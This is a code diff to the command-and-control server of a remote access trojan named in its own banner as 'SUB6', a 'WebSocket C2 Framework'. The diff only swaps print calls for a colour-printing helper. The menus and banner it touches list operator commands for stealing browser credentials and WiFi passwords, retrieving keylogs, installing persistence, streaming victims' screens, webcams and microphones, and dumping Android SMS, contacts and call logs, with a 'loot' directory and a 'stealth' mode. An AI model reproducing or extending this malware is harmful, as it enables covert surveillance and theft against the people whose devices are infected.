@@ -210,6 +210,10 @@ class WebSocketServer:
         )
         self.http_server_thread.start()
     
+    def cprint(self, message):
+        """Print with ANSI color support for prompt_toolkit"""
+        print_formatted_text(ANSI(message))
+    
     def async_print(self, message, end='\n'):
         """
         Thread-safe notification that doesn't break user input.
@@ -229,7 +233,7 @@ class WebSocketServer:
                 break
         if messages:
             for msg in messages:
-                print(msg)
+                self.cprint(msg)
     
     def print_with_flush(self, prompt_func=None):
         """Flush queued messages then print prompt"""
@@ -265,112 +269,112 @@ class WebSocketServer:
         RESET = '\033[0m'
         
         # Common commands for all platforms
-        print(f"\n{YELLOW}═══════════════════════════════════════════════════════════{RESET}")
+        self.cprint(f"\n{YELLOW}═══════════════════════════════════════════════════════════{RESET}")
         
         if os_type == 'windows':
-            print(f"              {CYAN}Session Commands{RESET} [{MAGENTA}WINDOWS{RESET}]")
+            self.cprint(f"              {CYAN}Session Commands{RESET} [{MAGENTA}WINDOWS{RESET}]")
         elif os_type == 'linux':
-            print(f"              {CYAN}Session Commands{RESET} [{GREEN}LINUX{RESET}]")
+            self.cprint(f"              {CYAN}Session Commands{RESET} [{GREEN}LINUX{RESET}]")
         elif os_type == 'android':
-            print(f"              {CYAN}Session Commands{RESET} [{GREEN}ANDROID{RESET}]")
+            self.cprint(f"              {CYAN}Session Commands{RESET} [{GREEN}ANDROID{RESET}]")
         else:
-            print(f"              {CYAN}Session Commands{RESET} [{RED}UNKNOWN OS{RESET}]")
+            self.cprint(f"              {CYAN}Session Commands{RESET} [{RED}UNKNOWN OS{RESET}]")
         
-        print(f"{YELLOW}═══════════════════════════════════════════════════════════{RESET}")
+        self.cprint(f"{YELLOW}═══════════════════════════════════════════════════════════{RESET}")
         
         # Common commands
-        print(f"\n  {YELLOW}[General]{RESET}")
-        print(f"  {GREEN}background{RESET}           - Return to server prompt")
-        print(f"  {GREEN}sysinfo{RESET}              - System information")
-        print(f"  {GREEN}screenshot{RESET}           - Take screenshot")
-        print(f"  {GREEN}shell{RESET}                - Interactive shell")
-        print(f"  {GREEN}ps{RESET}                   - List processes")
-        print(f"  {GREEN}download <file>{RESET}      - Download file from client")
-        print(f"  {GREEN}upload <file>{RESET}        - Upload file to client")
-        print(f"  {GREEN}cmd <command>{RESET}        - Execute single command")
-        print(f"  {GREEN}cd <path>{RESET}            - Change directory")
-        print(f"  {GREEN}pwd{RESET}                  - Show current directory")
-        print(f"  {GREEN}persist{RESET}              - Install persistence")
-        print(f"  {GREEN}unpersist{RESET}            - Remove persistence")
-        print(f"  {GREEN}exit{RESET}                 - Close client session")
+        self.cprint(f"\n  {YELLOW}[General]{RESET}")
+        self.cprint(f"  {GREEN}background{RESET}           - Return to server prompt")
+        self.cprint(f"  {GREEN}sysinfo{RESET}              - System information")
+        self.cprint(f"  {GREEN}screenshot{RESET}           - Take screenshot")
+        self.cprint(f"  {GREEN}shell{RESET}                - Interactive shell")
+        self.cprint(f"  {GREEN}ps{RESET}                   - List processes")
+        self.cprint(f"  {GREEN}download <file>{RESET}      - Download file from client")
+        self.cprint(f"  {GREEN}upload <file>{RESET}        - Upload file to client")
+        self.cprint(f"  {GREEN}cmd <command>{RESET}        - Execute single command")
+        self.cprint(f"  {GREEN}cd <path>{RESET}            - Change directory")
+        self.cprint(f"  {GREEN}pwd{RESET}                  - Show current directory")
+        self.cprint(f"  {GREEN}persist{RESET}              - Install persistence")
+        self.cprint(f"  {GREEN}unpersist{RESET}            - Remove persistence")
+        self.cprint(f"  {GREEN}exit{RESET}                 - Close client session")
         
         # Windows-specific commands
         if os_type == 'windows':
-            print(f"\n  {YELLOW}[Windows - Live Streaming (Smooth & High Quality)]{RESET}")
-            print(f"  {GREEN}liveview [fps] [quality]{RESET} - Live screen (default: 30fps 80%)")
-            print(f"  {GREEN}stoplive{RESET}             - Stop live screen view")
-            print(f"  {GREEN}camview [fps] [quality]{RESET} - Live webcam (default: 30fps 80%)")
-            print(f"  {GREEN}stopcam{RESET}              - Stop live webcam view")
-            print(f"  {GREEN}liveaudio [rate]{RESET}     - Live microphone (default: 22050Hz)")
-            print(f"  {GREEN}stopaudio{RESET}            - Stop live audio stream")
-            print(f"\n  {YELLOW}[Windows - Camera & Audio]{RESET}")
-            print(f"  {GREEN}listcam{RESET}              - List available cameras")
-            print(f"  {GREEN}selectcam <n>{RESET}        - Select camera by index")
-            print(f"  {GREEN}camshot{RESET}              - Take webcam photo")
-            print(f"  {GREEN}soundrecord [seconds]{RESET} - Record audio (1-300s)")
-            print(f"\n  {YELLOW}[Windows - Screen Recording]{RESET}")
-            print(f"  {GREEN}startrecord{RESET}          - Start screen recording (native res, 5fps)")
-            print(f"  {GREEN}stoprecord{RESET}           - Stop screen recording")
-            print(f"  {GREEN}getrecord{RESET}            - Download screen recording")
-            print(f"  {GREEN}delrecord{RESET}            - Delete screen recording")
-            print(f"\n  {YELLOW}[Windows - Mouse & Keyboard]{RESET}")
-            print(f"  {GREEN}mousemove <x> <y>{RESET}    - Move mouse to position")
-            print(f"  {GREEN}click / leftclick{RESET}    - Left mouse click")
-            print(f"  {GREEN}rightclick{RESET}           - Right mouse click")
-            print(f"  {GREEN}sendkeys <text>{RESET}      - Send keystrokes ([ENTER],[TAB],etc)")
-            print(f"\n  {YELLOW}[Windows - Extraction]{RESET}")
-            print(f"  {GREEN}browsercreds{RESET}         - Extract browser credentials & wifi")
-            print(f"  {GREEN}downloadfolder <dir>{RESET} - Download entire folder (zipped)")
-            print(f"\n  {YELLOW}[Windows - Persistence]{RESET}")
-            print(f"  {GREEN}keylogs{RESET}              - Download keylogger file")
-            print(f"  {GREEN}clearlogs{RESET}            - Clear keylogger file")
-            print(f"\n  {YELLOW}[Session Control]{RESET}")
-            print(f"  {GREEN}clear{RESET}                - Clear screen")
-            print(f"  {GREEN}back / background{RESET}    - Return to server prompt")
-            print(f"\n  {CYAN}Tip: Use 30+ fps and 80%+ quality for smooth HD streaming{RESET}")
+            self.cprint(f"\n  {YELLOW}[Windows - Live Streaming (Smooth & High Quality)]{RESET}")
+            self.cprint(f"  {GREEN}liveview [fps] [quality]{RESET} - Live screen (default: 30fps 80%)")
+            self.cprint(f"  {GREEN}stoplive{RESET}             - Stop live screen view")
+            self.cprint(f"  {GREEN}camview [fps] [quality]{RESET} - Live webcam (default: 30fps 80%)")
+            self.cprint(f"  {GREEN}stopcam{RESET}              - Stop live webcam view")
+            self.cprint(f"  {GREEN}liveaudio [rate]{RESET}     - Live microphone (default: 22050Hz)")
+            self.cprint(f"  {GREEN}stopaudio{RESET}            - Stop live audio stream")
+            self.cprint(f"\n  {YELLOW}[Windows - Camera & Audio]{RESET}")
+            self.cprint(f"  {GREEN}listcam{RESET}              - List available cameras")
+            self.cprint(f"  {GREEN}selectcam <n>{RESET}        - Select camera by index")
+            self.cprint(f"  {GREEN}camshot{RESET}              - Take webcam photo")
+            self.cprint(f"  {GREEN}soundrecord [seconds]{RESET} - Record audio (1-300s)")
+            self.cprint(f"\n  {YELLOW}[Windows - Screen Recording]{RESET}")
+            self.cprint(f"  {GREEN}startrecord{RESET}          - Start screen recording (native res, 5fps)")
+            self.cprint(f"  {GREEN}stoprecord{RESET}           - Stop screen recording")
+            self.cprint(f"  {GREEN}getrecord{RESET}            - Download screen recording")
+            self.cprint(f"  {GREEN}delrecord{RESET}            - Delete screen recording")
+            self.cprint(f"\n  {YELLOW}[Windows - Mouse & Keyboard]{RESET}")
+            self.cprint(f"  {GREEN}mousemove <x> <y>{RESET}    - Move mouse to position")
+            self.cprint(f"  {GREEN}click / leftclick{RESET}    - Left mouse click")
+            self.cprint(f"  {GREEN}rightclick{RESET}           - Right mouse click")
+            self.cprint(f"  {GREEN}sendkeys <text>{RESET}      - Send keystrokes ([ENTER],[TAB],etc)")
+            self.cprint(f"\n  {YELLOW}[Windows - Extraction]{RESET}")
+            self.cprint(f"  {GREEN}browsercreds{RESET}         - Extract browser credentials & wifi")
+            self.cprint(f"  {GREEN}downloadfolder <dir>{RESET} - Download entire folder (zipped)")
+            self.cprint(f"\n  {YELLOW}[Windows - Persistence]{RESET}")
+            self.cprint(f"  {GREEN}keylogs{RESET}              - Download keylogger file")
+            self.cprint(f"  {GREEN}clearlogs{RESET}            - Clear keylogger file")
+            self.cprint(f"\n  {YELLOW}[Session Control]{RESET}")
+            self.cprint(f"  {GREEN}clear{RESET}                - Clear screen")
+            self.cprint(f"  {GREEN}back / background{RESET}    - Return to server prompt")
+            self.cprint(f"\n  {CYAN}Tip: Use 30+ fps and 80%+ quality for smooth HD streaming{RESET}")
         
         # Linux-specific commands
         elif os_type == 'linux':
-            print(f"\n  {YELLOW}[Linux Streaming]{RESET}")
-            print(f"  {GREEN}liveview [fps] [q%]{RESET}  - Live screen stream (default: 30fps, 80%)")
-            print(f"  {GREEN}stoplive{RESET}             - Stop live screen stream")
-            print(f"  {GREEN}camview [fps] [q%]{RESET}   - Live camera stream (default: 15fps, 70%)")
-            print(f"  {GREEN}stopcam{RESET}              - Stop live camera stream")
-            print(f"  {GREEN}liveaudio [rate]{RESET}     - Live audio stream (default: 22050 Hz)")
-            print(f"  {GREEN}stopaudio{RESET}            - Stop live audio stream")
-            print(f"\n  {YELLOW}[Linux Camera]{RESET}")
-            print(f"  {GREEN}listcam{RESET}              - List available cameras")
-            print(f"  {GREEN}selectcam <n>{RESET}        - Select camera by index")
-            print(f"  {GREEN}camshot{RESET}              - Take webcam photo")
-            print(f"\n  {YELLOW}[Files & Extraction]{RESET}")
-            print(f"  {GREEN}download <file>{RESET}      - Download file from client")
-            print(f"  {GREEN}downloadfolder <path>{RESET}- Download folder as tar.gz")
-            print(f"  {GREEN}browsercreds{RESET}         - Extract browser data & WiFi passwords")
-            print(f"\n  {YELLOW}[Linux Keylogger]{RESET}")
-            print(f"  {GREEN}keylogs{RESET}              - Download input log (requires root)")
-            print(f"  {GREEN}clearlogs{RESET}            - Clear input log")
-            print(f"\n  {CYAN}Note: Streaming requires scrot/ffmpeg. Audio needs alsa-utils{RESET}")
+            self.cprint(f"\n  {YELLOW}[Linux Streaming]{RESET}")
+            self.cprint(f"  {GREEN}liveview [fps] [q%]{RESET}  - Live screen stream (default: 30fps, 80%)")
+            self.cprint(f"  {GREEN}stoplive{RESET}             - Stop live screen stream")
+            self.cprint(f"  {GREEN}camview [fps] [q%]{RESET}   - Live camera stream (default: 15fps, 70%)")
+            self.cprint(f"  {GREEN}stopcam{RESET}              - Stop live camera stream")
+            self.cprint(f"  {GREEN}liveaudio [rate]{RESET}     - Live audio stream (default: 22050 Hz)")
+            self.cprint(f"  {GREEN}stopaudio{RESET}            - Stop live audio stream")
+            self.cprint(f"\n  {YELLOW}[Linux Camera]{RESET}")
+            self.cprint(f"  {GREEN}listcam{RESET}              - List available cameras")
+            self.cprint(f"  {GREEN}selectcam <n>{RESET}        - Select camera by index")
+            self.cprint(f"  {GREEN}camshot{RESET}              - Take webcam photo")
+            self.cprint(f"\n  {YELLOW}[Files & Extraction]{RESET}")
+            self.cprint(f"  {GREEN}download <file>{RESET}      - Download file from client")
+            self.cprint(f"  {GREEN}downloadfolder <path>{RESET}- Download folder as tar.gz")
+            self.cprint(f"  {GREEN}browsercreds{RESET}         - Extract browser data & WiFi passwords")
+            self.cprint(f"\n  {YELLOW}[Linux Keylogger]{RESET}")
+            self.cprint(f"  {GREEN}keylogs{RESET}              - Download input log (requires root)")
+            self.cprint(f"  {GREEN}clearlogs{RESET}            - Clear input log")
+            self.cprint(f"\n  {CYAN}Note: Streaming requires scrot/ffmpeg. Audio needs alsa-utils{RESET}")
         
         # Android-specific commands  
         elif os_type == 'android':
-            print(f"\n  {YELLOW}[Android Only]{RESET}")
-            print(f"  {GREEN}listcam{RESET}              - List available cameras")
-            print(f"  {GREEN}selectcam <n>{RESET}        - Select camera by index")
-            print(f"  {GREEN}camshot{RESET}              - Take camera photo")
-            print(f"  {GREEN}sms{RESET}                  - Dump SMS messages (root)")
-            print(f"  {GREEN}contacts{RESET}             - Dump contacts (root)")
-            print(f"  {GREEN}calllog{RESET}              - Dump call history (root)")
-            print(f"  {GREEN}apps{RESET}                 - List installed apps")
-            print(f"  {GREEN}wifi{RESET}                 - WiFi info & saved networks")
-            print(f"  {GREEN}location{RESET}             - Get device location (root)")
-            print(f"  {CYAN}Note: Many features require rooted device{RESET}")
+            self.cprint(f"\n  {YELLOW}[Android Only]{RESET}")
+            self.cprint(f"  {GREEN}listcam{RESET}              - List available cameras")
+            self.cprint(f"  {GREEN}selectcam <n>{RESET}        - Select camera by index")
+            self.cprint(f"  {GREEN}camshot{RESET}              - Take camera photo")
+            self.cprint(f"  {GREEN}sms{RESET}                  - Dump SMS messages (root)")
+            self.cprint(f"  {GREEN}contacts{RESET}             - Dump contacts (root)")
+            self.cprint(f"  {GREEN}calllog{RESET}              - Dump call history (root)")
+            self.cprint(f"  {GREEN}apps{RESET}                 - List installed apps")
+            self.cprint(f"  {GREEN}wifi{RESET}                 - WiFi info & saved networks")
+            self.cprint(f"  {GREEN}location{RESET}             - Get device location (root)")
+            self.cprint(f"  {CYAN}Note: Many features require rooted device{RESET}")
         
         else:
-            print(f"\n  {RED}[OS not detected - showing all commands]{RESET}")
-            print(f"  {GREEN}keylogs{RESET}              - Download keylogger/input log")
-            print(f"  {GREEN}clearlogs{RESET}            - Clear log file")
+            self.cprint(f"\n  {RED}[OS not detected - showing all commands]{RESET}")
+            self.cprint(f"  {GREEN}keylogs{RESET}              - Download keylogger/input log")
+            self.cprint(f"  {GREEN}clearlogs{RESET}            - Clear log file")
         
-        print(f"\n{YELLOW}═══════════════════════════════════════════════════════════{RESET}\n")
+        self.cprint(f"\n{YELLOW}═══════════════════════════════════════════════════════════{RESET}\n")
     
     def start_input_thread(self):
         """Start background thread for reading input"""
@@ -1955,20 +1959,20 @@ class WebSocketServer:
     async def interact(self, session_id):
         """Interactive session with proper notification handling"""
         if session_id not in self.sessions:
-            print(f"[!] Session {session_id} not found")
+            self.cprint(f"[!] Session {session_id} not found")
             return
         
         self.active_session = session_id
         
-        print(f"\n[*] Interacting with session {session_id}")
-        print("[*] Type 'background' to return to server prompt")
-        print("[*] Type 'help' for commands\n")
+        self.cprint(f"\n[*] Interacting with session {session_id}")
+        self.cprint("[*] Type 'background' to return to server prompt")
+        self.cprint("[*] Type 'help' for commands\n")
         
         try:
             while self.running:
                 # Check if session still exists
                 if session_id not in self.sessions:
-                    print("\n[!] Session closed - returning to server prompt")
+                    self.cprint("\n[!] Session closed - returning to server prompt")
                     break
                 
                 try:
@@ -1983,13 +1987,13 @@ class WebSocketServer:
                     
                     # Double-check session still valid
                     if session_id not in self.sessions:
-                        print("\n[!] Session no longer exists")
+                        self.cprint("\n[!] Session no longer exists")
                         break
                     
                     cmd = cmd.strip()
                     
                     if cmd.lower() in ['background', 'back', 'bg']:
-                        print(f"\n[*] Backgrounding session {session_id}\n")
+                        self.cprint(f"\n[*] Backgrounding session {session_id}\n")
                         self.in_shell_mode = False
                         self.last_client_prompt = ''
                         break
@@ -2006,9 +2010,9 @@ class WebSocketServer:
                     if cmd in ['clear', 'cls']:
                         self.clear_screen()
                         if self.in_shell_mode and self.last_client_prompt:
-                            print(f"[*] Shell session active")
+                            self.cprint(f"[*] Shell session active")
                         else:
-                            print(f"[*] Session {session_id} active")
+                            self.cprint(f"[*] Session {session_id} active")
                         continue
                     
                     if cmd == 'help':
@@ -2025,14 +2029,14 @@ class WebSocketServer:
                     
                     # Send command to client
                     if not await self.send_command(session_id, cmd):
-                        print(f"\n[!] Failed to send command")
+                        self.cprint(f"\n[!] Failed to send command")
                         break
                     
                     # Wait for response
                     await asyncio.sleep(0.3)
                     
                 except KeyboardInterrupt:
-                    print(f"\n\n[*] Backgrounding session {session_id}\n")
+                    self.cprint(f"\n\n[*] Backgrounding session {session_id}\n")
                     break
         finally:
             self.active_session = None
@@ -2051,14 +2055,14 @@ class WebSocketServer:
         RESET = '\033[0m'
         
         if not self.sessions:
-            print(f"\n{YELLOW}[!]{RESET} No active sessions\n")
+            self.cprint(f"\n{YELLOW}[!]{RESET} No active sessions\n")
             return
         
-        print(f"\n{YELLOW}╔═══════════════════════════════════════════════════════════════════════════════╗{RESET}")
-        print(f"{YELLOW}║{RESET}                           {CYAN}{BOLD}ACTIVE SESSIONS {RESET}                                    {YELLOW}║{RESET}")
-        print(f"{YELLOW}╠═══════════════════════════════════════════════════════════════════════════════╣{RESET}")
-        print(f"{YELLOW}║{RESET}  {WHITE}ID{RESET}   {WHITE}OS{RESET}       {WHITE}Computer{RESET}              {WHITE}User{RESET}            {WHITE}Connected{RESET}   {WHITE}Status{RESET}       {YELLOW}║{RESET}")
-        print(f"{YELLOW}╠═══════════════════════════════════════════════════════════════════════════════╣{RESET}")
+        self.cprint(f"\n{YELLOW}╔═══════════════════════════════════════════════════════════════════════════════╗{RESET}")
+        self.cprint(f"{YELLOW}║{RESET}                           {CYAN}{BOLD}ACTIVE SESSIONS {RESET}                                    {YELLOW}║{RESET}")
+        self.cprint(f"{YELLOW}╠═══════════════════════════════════════════════════════════════════════════════╣{RESET}")
+        self.cprint(f"{YELLOW}║{RESET}  {WHITE}ID{RESET}   {WHITE}OS{RESET}       {WHITE}Computer{RESET}              {WHITE}User{RESET}            {WHITE}Connected{RESET}   {WHITE}Status{RESET}       {YELLOW}║{RESET}")
+        self.cprint(f"{YELLOW}╠═══════════════════════════════════════════════════════════════════════════════╣{RESET}")
         
         for sid, info in self.sessions.items():
             duration = datetime.now() - info['start_time']
@@ -2080,9 +2084,9 @@ class WebSocketServer:
             else:
                 os_str = f"{RED}???{RESET}     "
             
-            print(f"{YELLOW}║{RESET}  {GREEN}{sid:<4}{RESET} {os_str} {WHITE}{comp:<16}{RESET}  {WHITE}{user:<14}{RESET}  {WHITE}{time_str:<10}{RESET}  {status}         {YELLOW}║{RESET}")
+            self.cprint(f"{YELLOW}║{RESET}  {GREEN}{sid:<4}{RESET} {os_str} {WHITE}{comp:<16}{RESET}  {WHITE}{user:<14}{RESET}  {WHITE}{time_str:<10}{RESET}  {status}         {YELLOW}║{RESET}")
         
-        print(f"{YELLOW}╚═══════════════════════════════════════════════════════════════════════════════╝{RESET}\n")
+        self.cprint(f"{YELLOW}╚═══════════════════════════════════════════════════════════════════════════════╝{RESET}\n")
     
     def kill_session(self, session_id):
         """Kill a session"""
@@ -2110,9 +2114,9 @@ class WebSocketServer:
             del self.sessions[session_id]
             if self.active_session == session_id:
                 self.active_session = None
-            print(f"{RED}[*]{RESET} Session {CYAN}{session_id}{RESET} killed")
+            self.cprint(f"{RED}[*]{RESET} Session {CYAN}{session_id}{RESET} killed")
         else:
-            print(f"{RED}[!]{RESET} Session {CYAN}{session_id}{RESET} not found")
+            self.cprint(f"{RED}[!]{RESET} Session {CYAN}{session_id}{RESET} not found")
     
     async def command_loop(self):
         """Handle server commands with proper async notification support"""
@@ -2141,18 +2145,18 @@ class WebSocketServer:
                                 sid = int(parts[2])
                                 await self.interact(sid)
                             except ValueError:
-                                print("[!] Invalid session ID")
+                                self.cprint("[!] Invalid session ID")
                         elif len(parts) == 3 and parts[1] == '-k':
                             try:
                                 sid = int(parts[2])
                                 self.kill_session(sid)
                             except ValueError:
-                                print("[!] Invalid session ID")
+                                self.cprint("[!] Invalid session ID")
                         else:
-                            print("Usage: sessions [-l|-i <id>|-k <id>]")
+                            self.cprint("Usage: sessions [-l|-i <id>|-k <id>]")
                     
                     elif parts[0] in ['exit', 'quit']:
-                        print("\n[*] Shutting down...")
+                        self.cprint("\n[*] Shutting down...")
                         self.running = False
                         break
                     
@@ -2162,31 +2166,31 @@ class WebSocketServer:
                         YELLOW = '\033[93m'
                         WHITE = '\033[97m'
                         RESET = '\033[0m'
-                        print(f"\n{YELLOW}═══════════════════════════════════════════════════════════{RESET}")
-                        print(f"                    {CYAN}Server Commands{RESET}")
-                        print(f"{YELLOW}═══════════════════════════════════════════════════════════{RESET}")
-                        print(f"  {GREEN}sessions{RESET}             - List all sessions")
-                        print(f"  {GREEN}sessions -i <id>{RESET}     - Interact with session")
-                        print(f"  {GREEN}sessions -k <id>{RESET}     - Kill session")
-                        print(f"  {GREEN}clear{RESET}                - Clear screen")
-                        print(f"  {GREEN}help{RESET}                 - Show this help")
-                        print(f"  {GREEN}exit/quit{RESET}            - Exit server")
-                        print(f"{YELLOW}═══════════════════════════════════════════════════════════{RESET}\n")
+                        self.cprint(f"\n{YELLOW}═══════════════════════════════════════════════════════════{RESET}")
+                        self.cprint(f"                    {CYAN}Server Commands{RESET}")
+                        self.cprint(f"{YELLOW}═══════════════════════════════════════════════════════════{RESET}")
+                        self.cprint(f"  {GREEN}sessions{RESET}             - List all sessions")
+                        self.cprint(f"  {GREEN}sessions -i <id>{RESET}     - Interact with session")
+                        self.cprint(f"  {GREEN}sessions -k <id>{RESET}     - Kill session")
+                        self.cprint(f"  {GREEN}clear{RESET}                - Clear screen")
+                        self.cprint(f"  {GREEN}help{RESET}                 - Show this help")
+                        self.cprint(f"  {GREEN}exit/quit{RESET}            - Exit server")
+                        self.cprint(f"{YELLOW}═══════════════════════════════════════════════════════════{RESET}\n")
                     
                     elif parts[0] == 'clear' or parts[0] == 'cls':
                         self.clear_screen()
                         self.print_banner()
                     
                     else:
-                        print(f"[!] Unknown command: {cmd}")
-                        print("Type 'help' for available commands")
+                        self.cprint(f"[!] Unknown command: {cmd}")
+                        self.cprint("Type 'help' for available commands")
                     
                 except KeyboardInterrupt:
-                    print("\n\n[*] Use 'exit' to shut down")
+                    self.cprint("\n\n[*] Use 'exit' to shut down")
                 except EOFError:
                     break
                 except Exception as e:
-                    print(f"[!] Error: {e}")
+                    self.cprint(f"[!] Error: {e}")
     
     def print_banner(self):
         """Print ASCII banner"""
@@ -2200,28 +2204,28 @@ class WebSocketServer:
         BOLD = '\033[1m'
         RESET = '\033[0m'
         
-        print()
-        print(f"{RED}+----------------------------------------------------------------------+{RESET}")
-        print(f"{RED}|                                                                      |{RESET}")
-        print(f"{RED}|{RESET}                   {CYAN}{BOLD}SSSSS  U   U  BBBB    6666{RESET}                         {RED}|{RESET}")
-        print(f"{RED}|{RESET}                   {CYAN}{BOLD}S      U   U  B   B  6    {RESET}                         {RED}|{RESET}")
-        print(f"{RED}|{RESET}                   {CYAN}{BOLD}SSSSS  U   U  BBBB   6666 {RESET}                         {RED}|{RESET}")
-        print(f"{RED}|{RESET}                   {CYAN}{BOLD}    S  U   U  B   B  6   6{RESET}                         {RED}|{RESET}")
-        print(f"{RED}|{RESET}                   {CYAN}{BOLD}SSSSS  UUUUU  BBBB    666 {RESET}                         {RED}|{RESET}")
-        print(f"{RED}|                                                                      |{RESET}")
-        print(f"{RED}|{RESET}                  {YELLOW}  [ Remote Access Trojan ]{RESET}                         {RED}|{RESET}")
-        print(f"{RED}|                                                                      |{RESET}")
-        print(f"{RED}+----------------------------------------------------------------------+{RESET}")
-        print(f"{RED}|{RESET}   {WHITE}Author{RESET}  : {GREEN}Subodh{RESET}                                                   {RED}|{RESET}")
-        print(f"{RED}|{RESET}   {WHITE}Version{RESET} : {GREEN}1.0{RESET}                                                      {RED}|{RESET}")
-        print(f"{RED}|{RESET}   {WHITE}Type{RESET}    : {GREEN}WebSocket C2 Framework{RESET}                                   {RED}|{RESET}")
-        print(f"{RED}+----------------------------------------------------------------------+{RESET}")
-        print(f"{RED}|{RESET}   {MAGENTA}[+]{RESET} Keylogger        {MAGENTA}[+]{RESET} Screenshot        {MAGENTA}[+]{RESET} File Transfer       {RED}|{RESET}")
-        print(f"{RED}|{RESET}   {MAGENTA}[+]{RESET} Shell Access     {MAGENTA}[+]{RESET} Persistence       {MAGENTA}[+]{RESET} Process List        {RED}|{RESET}")
-        print(f"{RED}|{RESET}   {MAGENTA}[+]{RESET} Auto Reconnect   {MAGENTA}[+]{RESET} Stealth Mode      {MAGENTA}[+]{RESET} Multi-Session       {RED}|{RESET}")
-        print(f"{RED}|{RESET}   {MAGENTA}[+]{RESET} Live View        {MAGENTA}[+]{RESET} Camera View       {MAGENTA}[+]{RESET} Audio Recording     {RED}|{RESET}")
-        print(f"{RED}+----------------------------------------------------------------------+{RESET}")
-        print()
+        self.cprint("")
+        self.cprint(f"{RED}+----------------------------------------------------------------------+{RESET}")
+        self.cprint(f"{RED}|                                                                      |{RESET}")
+        self.cprint(f"{RED}|{RESET}                   {CYAN}{BOLD}SSSSS  U   U  BBBB    6666{RESET}                         {RED}|{RESET}")
+        self.cprint(f"{RED}|{RESET}                   {CYAN}{BOLD}S      U   U  B   B  6    {RESET}                         {RED}|{RESET}")
+        self.cprint(f"{RED}|{RESET}                   {CYAN}{BOLD}SSSSS  U   U  BBBB   6666 {RESET}                         {RED}|{RESET}")
+        self.cprint(f"{RED}|{RESET}                   {CYAN}{BOLD}    S  U   U  B   B  6   6{RESET}                         {RED}|{RESET}")
+        self.cprint(f"{RED}|{RESET}                   {CYAN}{BOLD}SSSSS  UUUUU  BBBB    666 {RESET}                         {RED}|{RESET}")
+        self.cprint(f"{RED}|                                                                      |{RESET}")
+        self.cprint(f"{RED}|{RESET}                  {YELLOW}  [ Remote Access Trojan ]{RESET}                         {RED}|{RESET}")
+        self.cprint(f"{RED}|                                                                      |{RESET}")
+        self.cprint(f"{RED}+----------------------------------------------------------------------+{RESET}")
+        self.cprint(f"{RED}|{RESET}   {WHITE}Author{RESET}  : {GREEN}Subodh{RESET}                                                   {RED}|{RESET}")
+        self.cprint(f"{RED}|{RESET}   {WHITE}Version{RESET} : {GREEN}1.0{RESET}                                                      {RED}|{RESET}")
+        self.cprint(f"{RED}|{RESET}   {WHITE}Type{RESET}    : {GREEN}WebSocket C2 Framework{RESET}                                   {RED}|{RESET}")
+        self.cprint(f"{RED}+----------------------------------------------------------------------+{RESET}")
+        self.cprint(f"{RED}|{RESET}   {MAGENTA}[+]{RESET} Keylogger        {MAGENTA}[+]{RESET} Screenshot        {MAGENTA}[+]{RESET} File Transfer       {RED}|{RESET}")
+        self.cprint(f"{RED}|{RESET}   {MAGENTA}[+]{RESET} Shell Access     {MAGENTA}[+]{RESET} Persistence       {MAGENTA}[+]{RESET} Process List        {RED}|{RESET}")
+        self.cprint(f"{RED}|{RESET}   {MAGENTA}[+]{RESET} Auto Reconnect   {MAGENTA}[+]{RESET} Stealth Mode      {MAGENTA}[+]{RESET} Multi-Session       {RED}|{RESET}")
+        self.cprint(f"{RED}|{RESET}   {MAGENTA}[+]{RESET} Live View        {MAGENTA}[+]{RESET} Camera View       {MAGENTA}[+]{RESET} Audio Recording     {RED}|{RESET}")
+        self.cprint(f"{RED}+----------------------------------------------------------------------+{RESET}")
+        self.cprint("")
     
     async def start(self):
         """Start the WebSocket server"""
@@ -2232,10 +2236,10 @@ class WebSocketServer:
         YELLOW = '\033[93m'
         RESET = '\033[0m'
         
-        print(f"{GREEN}[*]{RESET} WebSocket server: {CYAN}ws://{self.host}:{self.port}{RESET}")
-        print(f"{GREEN}[*]{RESET} Loot directory: {CYAN}./loot/{RESET}")
-        print(f"{YELLOW}[*]{RESET} Waiting for connections...")
-        print(f"{YELLOW}[*]{RESET} Type {CYAN}'help'{RESET} for available commands\n")
+        self.cprint(f"{GREEN}[*]{RESET} WebSocket server: {CYAN}ws://{self.host}:{self.port}{RESET}")
+        self.cprint(f"{GREEN}[*]{RESET} Loot directory: {CYAN}./loot/{RESET}")
+        self.cprint(f"{YELLOW}[*]{RESET} Waiting for connections...")
+        self.cprint(f"{YELLOW}[*]{RESET} Type {CYAN}'help'{RESET} for available commands\n")
         
         async with websockets.serve(
             self.handle_client, 
